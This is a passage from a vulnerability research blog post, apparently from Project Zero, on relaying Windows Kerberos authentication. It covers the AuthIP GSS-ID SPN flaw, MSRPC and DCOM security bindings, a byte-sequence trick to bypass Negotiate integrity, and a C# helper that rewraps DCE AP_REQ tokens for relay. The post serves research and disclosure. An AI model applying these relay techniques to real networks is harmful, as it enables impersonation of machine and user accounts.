 <p class="c0"><span class="c3">For example LDAP&#39;s default setting is to enable signing/encryption if the client supports it. Therefore you shouldn&#39;t be able to relay Kerberos authentication to LDAP if the client enabled any of these protections. However, other services such as HTTP don&#39;t typically support signing and sealing and so will happily accept authentication tokens which specify the request flags.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Another caveat is the client could specify channel binding information, typically derived from the certificate used by the TLS channel used in the communication. The channel binding information can be controlled by the attacker, but not set to arbitrary values without a bug in the TLS implementation or the code which determines the channel binding information itself. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>While services have an option to only enable channel binding if it&#39;s supported by the client, all Windows Kerberos AP_REQ tokens indicate support through the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b15648e2-439a-4d04-b8a2-2f34c45690f9">KERB_AP_OPTIONS_CBT</a></span><span class="c4">&nbsp;</span><span>options flag in the authenticator. </span><span>Sagi Sheinfeld et al did demonstrate (see slide 22 in </span><span class="c8"><a class="c51" href="https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf">their presentation</a></span><span>) </span><span>that if you can get the AP_REQ from a non-Windows source it will not set the options flag and so no channel binding is enforced, but that was apparently not something Microsoft will fix. It is also possible that a Windows client disables channel binding through a </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/authentication-fails-non-windows-ntlm-kerberos-server">registry configuration option</a></span><span class="c3">, although that seems to be unlikely in real world networks.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>If the client specifies the </span><span class="c4">ISC_REQ_MUTUAL_AUTH</span><span>&nbsp;request flag when generating the initial AP_REQ it will enable mutual authentication between the client and server. The client expects to receive an </span><span class="c4">Authentication Protocol Response (AP_REP)</span><span class="c3">&nbsp;token from the server after sending the AP_REQ to prove it has possession of the shared encryption key. If the server doesn&#39;t return a valid AP_REP the client can assume it&#39;s a spoofed server and refuse to continue the communication. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">From a relay perspective, mutual authentication doesn&#39;t really matter as the server is the target of the relay attack, not the client. The target server will assume the authentication has completed once it&#39;s accepted the AP_REQ, so that&#39;s all the attacker needs to forward. While the server will generate the AP_REP and return it to the attacker they can just drop it unless they need the relayed client to continue to participate in the communication for some reason.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>One final consideration is that the SSPI APIs have two security packages which can be used to implement Kerberos authentication, </span><span class="c4">Negotiate</span><span>&nbsp;and </span><span class="c4">Kerberos</span><span>. The </span><span class="c4">Negotiate</span><span>&nbsp;protocol wraps the AP_REQ (and other authentication tokens) in the </span><span class="c8"><a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4178">SPNEGO protocol</a></span><span>&nbsp;whereas </span><span class="c4">Kerberos</span><span>&nbsp;sends the authentication tokens using a simple GSS-API wrapper (see </span><span class="c8"><a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4121">RFC4121</a></span><span class="c3">). </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The first potential issue is </span><span class="c4">Negotiate</span><span>&nbsp;is by far the most likely package in use as it allows a network protocol the flexibility to use the most appropriate authentication protocol that the client and server both support. However, what happens if the client uses the raw </span><span class="c4">Kerberos </span><span>package but the server uses </span><span class="c4">Negotiate</span><span class="c3">? </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>This isn&#39;t a problem as the server implementation of </span><span class="c4">Negotiate </span><span>will pass the input token to the function </span><span class="c4">NegpDetermineTokenPackage</span><span>&nbsp;in </span><span class="c4">lsasrv.dll</span><span>&nbsp;during the first call to </span><span class="c4">AcceptSecurityContext</span><span>. This function detects if the client has passed a GSS-API Kerberos token (or NTLM) and enables a pass through mode where </span><span class="c4">Negotiate </span><span>gets out of the way. Therefore even if the client uses the </span><span class="c4">Kerberos </span><span class="c3">package you can still authenticate to the server and keep the client happy without having to extract the inner authentication token or wrap up response tokens.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>One actual issue for relaying is the </span><span class="c4">Negotiate </span><span>protocol enables integrity protection (equivalent to passing </span><span class="c4">ISC_REQ_INTEGRITY</span><span>&nbsp;to the underlying package) so that it can generate a </span><span class="c4">Message Integrity Code (MIC)</span><span>&nbsp;for the authentication exchange to prevent tampering. Using the </span><span class="c4">Kerberos </span><span>package directly won&#39;t add integrity protection automatically. Therefore relaying Kerberos AP_REQs from </span><span class="c4">Negotiate </span><span>will likely hit issues related to automatic enabling of signing on the server. It is possible for a client to explicitly disable automatic integrity checking by passing the </span><span class="c4">ISC_REQ_NO_INTEGRITY</span><span class="c3">&nbsp;request attribute, but that&#39;s not a common case.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>It&#39;s possible to disable </span><span class="c4">Negotiate </span><span>from the relay if the client passes an arbitrary authentication token to the first call of the </span><span class="c4">InitializeSecurityContext</span><span>&nbsp;API. On the first call the </span><span class="c4">Negotiate</span><span>&nbsp;implementation will call the </span><span class="c4">NegpDetermineTokenPackage</span><span>&nbsp;function to determine whether to enable authentication pass through. If the initial token is NTLM or looks like a Kerberos token then it&#39;ll pass through directly to the underlying security package and it won&#39;t set </span><span class="c4">ISC_REQ_INTEGRITY</span><span>, unless the client explicitly requested it. The byte sequence [0x00, 0x01, 0x40] is sufficient to get </span><span class="c4">Negotiate </span><span class="c3">to detect Kerberos, and the token is then discarded so it doesn&#39;t have to contain any further valid data.</span></p><h2 class="c26" id="h.tx92zzdoh7eu"><span class="c6 c19">Sniffing and Proxying Traffic</span></h2>
 <p class="c0"><span class="c3">Before going into individual protocols that I&#39;ve researched, it&#39;s worth discussing some more obvious ways of getting access to Kerberos authentication targeted at other services. First is sniffing network traffic sent from client to the server. For example, if the Kerberos AP_REQ is sent to a service over an unencrypted network protocol and the attacker can view that traffic the AP_REQ could be extracted and relayed. The selection of the SPN will be based on the expected traffic so the attacker doesn&#39;t need to do anything to influence it.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The Kerberos authentication protocol has protections against this attack vector. The Kerberos AP_REQ doesn&#39;t just contain the service ticket, it&#39;s also accompanied by an </span><span class="c4">Authenticator</span><span class="c3">&nbsp;which is encrypted using the ticket&#39;s session key. This key is accessible by both the legitimate client and the service. The authenticator contains a timestamp of when it was generated, and the service can check if this authenticator is within an allowable time range and whether it has seen the timestamp already. This allows the service to reject replayed authenticators by caching recently received values, and the allowable time window prevents the attacker waiting for any cache to expire before replaying.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">What this means is that while an attacker could sniff the Kerberos authentication on the wire and relay it, if the service has already received the authenticator it would be rejected as being a replay. The only way to exploit it would be to somehow prevent the legitimate authentication request from reaching the service, or race the request so that the attacker&#39;s packet is processed first.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c4">Note, </span><span class="c8 c4"><a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4120#section-3.2.3">RFC4120</a></span><span class="c25 c14 c4">&nbsp;mentions the possibility of embedding the client&#39;s network address in the authenticator so that the service could reject authentication coming from the wrong host. This isn&#39;t used by the Windows Kerberos implementation as far as I can tell. No doubt it would cause too many false positives for the replay protection in anything but the simplest enterprise networks.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Therefore the only reliable way to exploit this scenario would be to actively interpose on the network communications between the client and service. This is of course practical and has been demonstrated many times assuming the traffic isn&#39;t protected using something like TLS with server verification. Various attacks would be possible such as ARP or DNS spoofing attacks or HTTP proxy redirection to perform the </span><span>interposition</span><span class="c3">&nbsp;of the traffic.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">However, active MitM of protocols is a known risk and therefore an enterprise might have technical defenses in place to mitigate the issue. Of course, if such enterprises have enabled all the recommended relay protections,it&#39;s a moot point. Regardless, we&#39;ll assume that MitM is impractical for existing services due to protections in place and consider how individual protocols handle SPN selection.</span></p><h2 class="c26" id="h.jst25c8kuijh"><span class="c6 c19">IPSec and AuthIP</span></h2>
 <p class="c0"><span>My research into Kerberos authentication relay came about in part because I was looking into the implementation of IPSec on Windows as part of my firewall research. Specifically I was researching the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-aips/eee3de64-3847-4451-978e-9513ff187d30">AuthIP ISAKMP</a></span><span class="c3">&nbsp;which allows for Windows authentication protocols to be used to establish IPsec Security Associations. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>I noticed that the AuthIP protocol has a </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-aips/9ab1ccc0-d92e-4ca4-bae9-1c93871399ac">GSS-ID payload</a></span><span>&nbsp;which can be sent from the server to the client. This payload contains the textual SPN to use for the Kerberos authentication during the AuthIP process. This SPN is passed verbatim to the SSPI </span><span class="c4">InitializeSecurityContext</span><span>&nbsp;call by the AuthIP client.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">As no verification is done on the format of the SPN in the GSS-ID payload, it allows the attacker to fully control the values including the service class and instance name. Therefore if an attacker can induce a domain joined machine to connect to an attacker controlled service and negotiate AuthIP then a Kerberos AP_REQ for an arbitrary SPN can be captured for relay use. As this AP_REQ is never sent to the target of the SPN it will not be detected as a replay.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Inducing authentication isn&#39;t necessarily difficult. Any IP traffic which is covered by the domain </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/configure-the-rules-to-require-encryption">configured security connection rules</a></span><span>&nbsp;will attempt to perform AuthIP. For example it&#39;s possible that a UDP response for a DNS request from the domain controller might be sufficient. AuthIP supports two authenticated users, the machine and the calling user. By default it seems the machine authenticates first, so if you convinced a Domain Controller to authenticate you&#39;d get the DC computer account which c</span><span>ould be fairly exploitable.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c4">For interest&#39;s sake, the SPN is also used to determine the computer account associated with the server. This computer account is then used with </span><span class="c8 c4"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">Service For User (S4U)</a></span><span class="c4">&nbsp;to generate a local access token allowing the client to determine the identity of the server. However I don&#39;t think this is that useful as the fake server can&#39;t complete the authentication and the connection will be discarded.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">The security connection rules use IP address ranges to determine what hosts need IPsec authentication. If these address ranges are too broad it&#39;s also possible that ISAKMP AuthIP traffic might leak to external networks. For example if the rules don&#39;t limit the network ranges to the enterprise&#39;s addresses, then even a connection out to a public service could be accompanied by the ISAKMP AuthIP packet. This can be then exploited by an attacker who is not co-located on the enterprise network just by getting a client to connect to their server, such as through a web URL.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"></p>
 <p class="c0"><span class="c4"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEiDuaDAyi9I9zQlGa5gBZnE1I_KIMDq-jtVM1kni1B7whSMYuGvC2xaQA75T9cjmVkuBzkHxQxWbN3hiEWaEeJ-Ci1aGxReamFMy83glKslnxT_evjrIy7SZl-yMvg3OgdamPqIttMyXw7kzSKjnbyny3qcrUSQFANJCH55j_FaeOaFFnsROkTr8ABomw=s835" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEiDuaDAyi9I9zQlGa5gBZnE1I_KIMDq-jtVM1kni1B7whSMYuGvC2xaQA75T9cjmVkuBzkHxQxWbN3hiEWaEeJ-Ci1aGxReamFMy83glKslnxT_evjrIy7SZl-yMvg3OgdamPqIttMyXw7kzSKjnbyny3qcrUSQFANJCH55j_FaeOaFFnsROkTr8ABomw=s835" border="0" alt="Diagram of a relay using a fake AuthIP server" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">To summarize the attack process from the diagram:</span></p><ol class="c24 lst-kix_d25vxsk234hv-0 start" start="1"><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>Induce a client computer to send some network traffic to </span><span class="c4">EVILHOST</span><span>. It doesn&#39;t really matter what the traffic is, only that the IP address, type and port must match an IP security connection rule to use AuthIP. </span><span class="c4">EVILHOST </span><span class="c3">does not need to be domain joined to perform the attack.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c3">The network traffic will get the Windows IPsec client to try and establish a security association with the target host.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>A fake AuthIP server on the target host receives the request to establish a security association and returns a GSS-ID payload. This payload contains the target SPN, for example </span><span class="c4">CIFS/FILESERVER</span><span class="c3">.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span>The IPsec client uses the SPN to create an AP_REQ token and sends it to </span><span class="c4">EVILHOST</span><span class="c3">.</span></li><li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"><span class="c4">EVILHOST</span><span>&nbsp;relays the Kerberos AP_REQ to the target service on </span><span class="c4">FILESERVER</span><span class="c3">.</span></li></ol>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Relaying this AuthIP authentication isn&#39;t ideal from an attacker&#39;s perspective. As the authentication will be used to sign and seal the network traffic, the request context flags for the call to </span><span class="c4">InitializeSecurityContext</span><span class="c3">&nbsp;will require integrity and confidentiality protection. For network protocols such as LDAP which default to requiring signing and sealing if the client supports it, this would prevent the relay attack from working. However if the service ignores the protection and doesn&#39;t have any further checks in place this would be sufficient. </span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>This issue was </span><span class="c8"><a class="c51" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2213">reported to MSRC</a></span><span>&nbsp;and assigned case number 66900. However Microsoft have indicated that it will not be fixed with a security bulletin. </span><span>I&#39;ve described Microsoft&#39;s rationale for not fixing this issue later in the blog post</span><span>. If you want to reproduce this issue there&#39;s details on Project Zero&#39;s </span><span class="c8"><a class="c51" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2213">issue tracker</a></span><span class="c3">.</span></p><h2 class="c26" id="h.27tuyymck8fh"><span class="c6 c19">MSRPC</span></h2>
 <p class="c0"><span>After discovering that AuthIP could allow for authentication relay the next protocol I looked at is </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page">MSRPC</a></span><span>. The protocol supports </span><span class="c4">NTLM</span><span>, </span><span class="c4">Kerberos</span><span>&nbsp;or </span><span class="c4">Negotiate</span><span>&nbsp;authentication protocols over connected network transports such as named pipes or TCP. These authentication protocols need to be opted into by the server using the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterauthinfo">RpcServerRegisterAuthInfo</a></span><span>&nbsp;API by specifying the authentication service constants of </span><span class="c4">RPC_C_AUTHN_WINNT</span><span>, </span><span class="c4">RPC_C_AUTHN_GSS_KERBEROS</span><span>&nbsp;or </span><span class="c4">RPC_C_AUTHN_GSS_NEGOTIATE</span><span class="c3">&nbsp;respectively. When registering the authentication information the server can optionally specify the SPN that needs to be used by the client.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>However, this SPN isn&#39;t actually used by the RPC server itself. Instead it&#39;s registered with the runtime, and a client can query the server&#39;s SPN using the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtinqserverprincname">RpcMgmtInqServerPrincName </a></span><span>management API. Once the SPN is queried the client can configure its authentication for the connection using the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo">RpcBindingSetAuthInfo</a></span><span>&nbsp;API. However, this isn&#39;t required; the client could just generate the SPN manually and set it. If the client doesn&#39;t call </span><span class="c4">RpcBindingSetAuthInfo</span><span class="c3">&nbsp;then it will not perform any authentication on the RPC connection.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c4">Aside, curiously when a connection is made to the server it can query the client&#39;s authentication information using the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindinginqauthclient">RpcBindingInqAuthClient</a></span><span class="c4">&nbsp;API. However, the SPN that this API returns is the one registered by RpcServerRegisterAuthInfo and NOT the one which was used by the client to authenticate. Also Microsoft does mention the call to RpcMgmtInqServerPrincName in the &quot;</span><span class="c8 c4"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/rpc/choosing-security-qos-options">Writing a secure RPC client or server</a></span><span class="c25 c14 c4">&quot; section on MSDN. However they frame it in the context of mutual authentication and not to protect against a relay attack.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>If a client queries for the SPN from a malicious RPC server it will authenticate using a Kerberos AP_REQ for an SPN fully under the attacker&#39;s control. Whether the AP_REQ has integrity or confidentiality enabled depends on the authentication level set during the call to </span><span class="c4">RpcBindingSetAuthInfo</span><span>. If this is set to </span><span class="c4">RPC_C_AUTHN_LEVEL_CONNECT</span><span>&nbsp;and the client uses </span><span class="c4">RPC_C_AUTHN_GSS_KERBEROS</span><span>&nbsp;then the AP_REQ won&#39;t have integrity enabled. However, if </span><span class="c4">Negotiate </span><span>is used or anything above </span><span class="c4">RPC_C_AUTHN_LEVEL_CONNECT</span><span class="c3">&nbsp;as a level is used then it will have the integrity/confidentiality flags set.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Doing a quick scan in </span><span class="c4">system32 </span><span>the following DLLs call the </span><span class="c4">RpcMgmtInqServerPrincName</span><span>&nbsp;API: </span><span class="c4">certcli.dll, dot3api.dll, dusmsvc.dll, FrameServerClient.dll, L2SecHC.dll, luiapi.dll, msdtcprx.dll, nlaapi.dll, ntfrsapi.dll, w32time.dll, WcnApi.dll, WcnEapAuthProxy.dll, WcnEapPeerProxy.dll, witnesswmiv2provider.dll, wlanapi.dll, wlanext.exe, WLanHC.dll, wlanmsm.dll, wlansvc.dll, wwansvc.dll, wwapi.dll. </span><span>Some basic analysis shows that none of these clients check the value of the SPN and use it verbatim with </span><span class="c4">RpcBindingSetAuthInfo</span><span>. That said, they all seem to use </span><span class="c4">RPC_C_AUTHN_GSS_NEGOTIATE</span><span>&nbsp;and set the authentication level to </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_PRIVACY</span><span class="c3">&nbsp;which makes them less useful as an attack vector.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>If the client specifies </span><span class="c4">RPC_C_AUTHN_GSS_NEGOTIATE</span><span>&nbsp;but does not specify an SPN then the runtime generates one automatically. This is based on the target hostname with the </span><span class="c4">RestrictedKrbHost </span><span>service class. The runtime doesn&#39;t process the hostname, it just concatenates strings and for some reason the runtime doesn&#39;t support generating the SPN for </span><span class="c4">RPC_C_AUTHN_GSS_KERBEROS</span><span class="c3">.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>One additional quirk of the RPC runtime is that the request attribute flag </span><span class="c4">ISC_REQ_USE_DCE_STYLE</span><span>&nbsp;is used when calling </span><span class="c4">InitializeSecurityContext</span><span>. This enables a </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/190ab8de-dc42-49cf-bf1b-ea5705b7a087">special three-leg authentication mode</a></span><span class="c3">&nbsp;which results in the server sending back an AP_RET and then receiving another AP_RET from the client. Until that third AP_RET has been provided to the server it won&#39;t consider the authentication complete so it&#39;s not sufficient to just forward the initial AP_REQ token and close the connection to the client. This just makes the relay code slightly more complex but not impossible.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>A second change that </span><span class="c4">ISC_REQ_USE_DCE_STYLE</span><span>&nbsp;introduces is that the Kerberos AP_REQ token does not have an GSS-API wrapper. This causes the call to </span><span class="c4">NegpDetermineTokenPackage</span><span>&nbsp;to fail to detect the package in use, making it impossible to directly forward the traffic to a server using the </span><span class="c4">Negotiate</span><span>&nbsp;package. However, this prefix is not protected against modification so the relay code can append the appropriate value before forwarding to the server. For example the following C# code can be used to convert a DCE style AP_REQ to a GSS-API format which </span><span class="c4">Negotiate </span><span class="c3">will accept.</span></p>
 <p class="c0 c9"><span class="c3"></span></p><a id="t.3c51830e72fcb7113b1dc4666718252f7b0b751f"></a><a id="t.0"></a><table class="c21"><tbody><tr class="c20"><td class="c11" colspan="1" rowspan="1">
 <p class="c7"><span class="c2 c13">public</span><span class="c2">&nbsp;</span><span class="c2 c13">static</span><span class="c2">&nbsp;</span><span class="c2 c13">byte</span><span class="c2">[] EncodeLength(</span><span class="c2 c13">int</span><span class="c6 c2">&nbsp;length)</span></p>
 <p class="c7"><span class="c6 c2">{</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">if</span><span class="c2 c6">&nbsp;(length &lt; 0x80)</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c2 c13">return</span><span class="c2">&nbsp;</span><span class="c2 c13">new</span><span class="c2">&nbsp;</span><span class="c2 c13">byte</span><span class="c2">[] { (</span><span class="c2 c13">byte</span><span class="c6 c2">)length };</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">if</span><span class="c6 c2">&nbsp;(length &lt; 0x100)</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c2 c13">return</span><span class="c2">&nbsp;</span><span class="c2 c13">new</span><span class="c2">&nbsp;</span><span class="c2 c13">byte</span><span class="c2">[] { 0x81, (</span><span class="c2 c13">byte</span><span class="c6 c2">)length };</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">if</span><span class="c6 c2">&nbsp;(length &lt; 0x10000)</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c2 c13">return</span><span class="c2">&nbsp;</span><span class="c2 c13">new</span><span class="c2">&nbsp;</span><span class="c2 c13">byte</span><span class="c2">[] { 0x82, (</span><span class="c2 c13">byte</span><span class="c6 c2">)(length &gt;&gt; 8), </span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (</span><span class="c2 c13">byte</span><span class="c6 c2">)(length &amp; 0xFF) };</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">throw</span><span class="c2">&nbsp;</span><span class="c2 c13">new</span><span class="c2">&nbsp;ArgumentException(</span><span class="c2 c36">&quot;Invalid length&quot;</span><span class="c6 c2">, nameof(length));</span></p>
 <p class="c7"><span class="c6 c2">}</span></p>
 <p class="c7 c9"><span class="c6 c2"></span></p>
 <p class="c7"><span class="c2 c13">public</span><span class="c2">&nbsp;</span><span class="c2 c13">static</span><span class="c2">&nbsp;</span><span class="c2 c13">byte</span><span class="c2">[] ConvertApReq(</span><span class="c2 c13">byte</span><span class="c6 c2">[] token)</span></p>
 <p class="c7"><span class="c6 c2">{</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">if</span><span class="c6 c2">&nbsp;(token.Length == 0 || token[0] != 0x6E)</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c2 c13">return</span><span class="c6 c2">&nbsp;token;</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; MemoryStream stm = </span><span class="c2 c13">new</span><span class="c6 c2">&nbsp;MemoryStream();</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; BinaryWriter writer = </span><span class="c2 c13">new</span><span class="c6 c2">&nbsp;BinaryWriter(stm);</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; Console.WriteLine(</span><span class="c2 c36">&quot;Converting DCE AP_REQ to GSS-API format.&quot;</span><span class="c6 c2">);</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">byte</span><span class="c2">[] header = </span><span class="c2 c13">new</span><span class="c2">&nbsp;</span><span class="c2 c13">byte</span><span class="c6 c2">[] { 0x06, 0x09, 0x2a, 0x86, 0x48, </span></p>
 <p class="c7"><span class="c6 c2">&nbsp; &nbsp; &nbsp; &nbsp;0x86, 0xf7, 0x12, 0x01, 0x02, 0x02, 0x01, 0x00 };</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; writer.Write((</span><span class="c2 c13">byte</span><span class="c6 c2">)0x60);</span></p>
 <p class="c7"><span class="c6 c2">&nbsp; &nbsp; writer.Write(EncodeLength(header.Length + token.Length));</span></p>
 <p class="c7"><span class="c6 c2">&nbsp; &nbsp; writer.Write(header);</span></p>
 <p class="c7"><span class="c6 c2">&nbsp; &nbsp; writer.Write(token);</span></p>
 <p class="c7"><span class="c2">&nbsp; &nbsp; </span><span class="c2 c13">return</span><span class="c6 c2">&nbsp;stm.ToArray();</span></p>
 <p class="c7"><span class="c2">}</span></p></td></tr></tbody></table>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Subsequent tokens in the authentication process don&#39;t need to be wrapped; in fact, wrapping them with their GSS-API headers will cause the authentication to fail. Relaying MSRPC requests would probably be difficult just due to the relative lack of clients which request the server&#39;s SPN. Also when the SPN is requested it tends to be a conscious act of securing the client and so best practice tends to require the developer to set the maximum authentication level, making the Kerberos AP_REQ less useful.</span></p><h2 class="c26" id="h.pn61xux6i1ia"><span class="c6 c19">DCOM</span></h2>
 <p class="c0"><span>The DCOM protocol uses MSRPC under the hood to access remote COM objects, therefore it should have the same behavior as MSRPC. The big difference is DCOM is designed to automatically handle the authentication requirements of a remote COM object through binding information contained in the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/7fe8200b-dccd-48cf-a2fa-681e3e0a23f4">DUALSTRINGARRAY</a></span><span>&nbsp;returned during </span><span class="c4">Object Exporter ID (OXID)</span><span>&nbsp;resolving. Therefore the client doesn&#39;t need to explicitly call </span><span class="c4">RpcBindingSetAuthInfo </span><span class="c3">to configure the authentication.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>The binding information contains the protocol sequence and endpoint to use (such as TCP on port 30000) as well as the security bindings. Each security binding contains the RPC authentication service (</span><span class="c4">wAuthnSvc</span><span>&nbsp;in the below screenshot) to use as well as an optional SPN (</span><span class="c4">aPrincName</span><span>) for the authentication. Therefore a malicious DCOM server can force the client to use the </span><span class="c4">RPC_C_AUTHN_GSS_KERBEROS</span><span class="c3">&nbsp;authentication service with a completely arbitrary SPN by returning an appropriate security binding.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"></p>
 <p class="c0"><span class="c14 c4 c25"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEiN78ReCzU5wVJ3qCozRJ2MSkKX4-Bm_S0zDSU2TNs6BrYoBffMIr7WZuL4AiNiO8rbVWrTkdGwjp6S2yyQptBIh82kWiKNOU-ziSntZpjGETP1TfIvXYzKFQyyW9C_qMEyoM3c1-7tdoqNLWxh2RYuq1pgbBFAtUCTjyQZzrU1h7mOxFnAl2l1PQBEuw=s1372" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEiN78ReCzU5wVJ3qCozRJ2MSkKX4-Bm_S0zDSU2TNs6BrYoBffMIr7WZuL4AiNiO8rbVWrTkdGwjp6S2yyQptBIh82kWiKNOU-ziSntZpjGETP1TfIvXYzKFQyyW9C_qMEyoM3c1-7tdoqNLWxh2RYuq1pgbBFAtUCTjyQZzrU1h7mOxFnAl2l1PQBEuw=s1372" border="0" alt="Screenshot of part of the MS-DCOM protocol documentation showing the SECURITYBINDING structure" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0 c9"><span class="c25 c14 c4"></span></p>
 <p class="c0"><span>The authentication level chosen by the client depends on the value of the </span><span class="c4">dwAuthnLevel</span><span>&nbsp;parameter specified if the COM client calls the </span><span class="c8"><a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity">CoInitializeSecurity</a></span><span>&nbsp;API.</span><span>&nbsp;If the client doesn&#39;t explicitly call </span><span class="c4">CoInitializeSecurity</span><span>&nbsp;then a default will be used which </span><span>is currently </span><span class="c4">RPC_C_AUTHN_LEVEL_CONNECT.</span><span class="c3">&nbsp;This means neither integrity or confidentiality will be enforced on the Kerberos AP_REQ by default.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
